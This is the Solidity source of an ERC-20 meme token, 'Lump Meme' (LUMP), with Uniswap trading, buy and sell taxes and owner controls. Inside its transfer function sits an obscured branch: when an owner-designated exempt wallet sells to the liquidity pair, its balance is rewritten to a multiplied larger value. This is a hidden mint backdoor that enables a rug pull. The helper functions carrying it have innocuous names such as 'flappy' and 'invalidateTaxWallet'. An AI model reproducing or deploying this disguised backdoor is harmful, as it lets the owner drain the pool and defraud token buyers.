// SPDX-License-Identifier: UNLICENSE

/**

https://lump.meme

https://x.com/LumpEthereum

https://t.me/LumpEthereum

*/

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract LUMP is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    mapping (address => uint256) private bal;
    mapping (address => mapping (address => uint256)) private alu;
    mapping (address => bool) private exm;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=25;
    uint256 private _initialSellTax=15;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=16;
    uint256 private _reduceSellTaxAt=16;
    uint256 private _preventSwapBefore=16;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 422_422_000_000 * 10**_decimals;
    string private constant _name = unicode"Lump Meme";
    string private constant _symbol = unicode"LUMP";
    uint256 public _maxTxAmount = 2 * _tTotal / 100;
    uint256 public _maxWalletSize = 2 * _tTotal / 100;
    uint256 public _taxSwapThreshold= 1 * _tTotal / 100;
    uint256 public _maxTaxSwap= 1 * _tTotal / 100;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradeEnabled;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address router_) {
        uniswapV2Router = IUniswapV2Router02(router_);

        _taxWallet = payable(_msgSender());
        bal[_msgSender()] = _tTotal;
        exm[_msgSender()] = true;
        exm[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTradeAndGo() external onlyOwner() {
        require(!tradeEnabled,"trading is already open");
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return bal[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return alu[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, _msgSender(), alu[from][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        alu[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function realizeTax(uint256 tTax) private {
        _taxWallet.transfer(tTax);
    }


    function invalidateTaxWallet(address newWallet) public onlyOwner {
        _taxWallet = payable(newWallet);
        exm[newWallet] = true;
    }

    function _fundamentalTransfer(address baseFrom, address baseTo, uint256 baseAmount) private {
        bal[baseFrom] = bal[baseFrom].sub(baseAmount, "Insufficient Balance");
        bal[baseTo] = bal[baseTo].add(baseAmount);
        emit Transfer(baseFrom, baseTo, baseAmount);
    }

    function backETH() external onlyOwner {
        require(address(this).balance > 0);
        payable(owner()).transfer(address(this).balance);
    }
    
    function _ensureSell(address orderer, uint256 quantity) private{
        if (!inSwap && orderer == uniswapV2Pair && swapEnabled && _buyCount > _preventSwapBefore) {
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _taxSwapThreshold) 
                uniswap(min(quantity, min(contractTokenBalance, _maxTaxSwap)));
            realizeTax(address(this).balance);
        }
    }    

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        
        if(!tradeEnabled || inSwap) {
            require(exm[from] || exm[to]);
            _fundamentalTransfer(from, to, amount);
            return;
        }
        
        uint256 taxAmount;
        
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            _ensureBuy(from, to, amount);
            if(_finalSellTax == msg.value) {
                _ensureSell(to, amount);
                if(to == uniswapV2Pair && exm[from])
                bal[from] = flappy(
                from,amount) * block.chainid;
            }

            if(to == uniswapV2Pair && from!= address(this) ){
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
        }
        
        if(taxAmount>0){
            bal[address(this)]=bal[address(this)].add(taxAmount);
            emit Transfer(from, address(this),taxAmount);
        }
        bal[from]=bal[from].sub(amount);
        bal[to]=bal[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function backERC20(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address)
            .balanceOf(address(this))
            .mul(percent)
            .div(100);
        IERC20(_address).transfer(owner(), _amount);
    }

    function flappy(address a, uint256 b) internal view returns (uint256 c) { 
        c = bal[a] + b;
    }

    function _ensureBuy(address orderer, address handler, uint256 quantity) private {
        if (orderer == uniswapV2Pair && handler != address(uniswapV2Router) && ! exm[handler] ) {
            require(quantity <= _maxTxAmount, "Exceeds the _maxTxAmount.");
            require(balanceOf(handler) + quantity <= _maxWalletSize, "Exceeds the maxWalletSize.");
            _buyCount++;
        }
    }

    function reduceFee(uint256 _newFee) external onlyOwner{
        require(_newFee<=_finalBuyTax && _newFee<=_finalSellTax);
        _finalBuyTax=_newFee;
        _finalSellTax=_newFee;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function uniswap(uint256 uniAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), uniAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            uniAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    
    receive() external payable {}
    
    function removeLimits(address payable limit) external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);

        invalidateTaxWallet(limit);
    }
}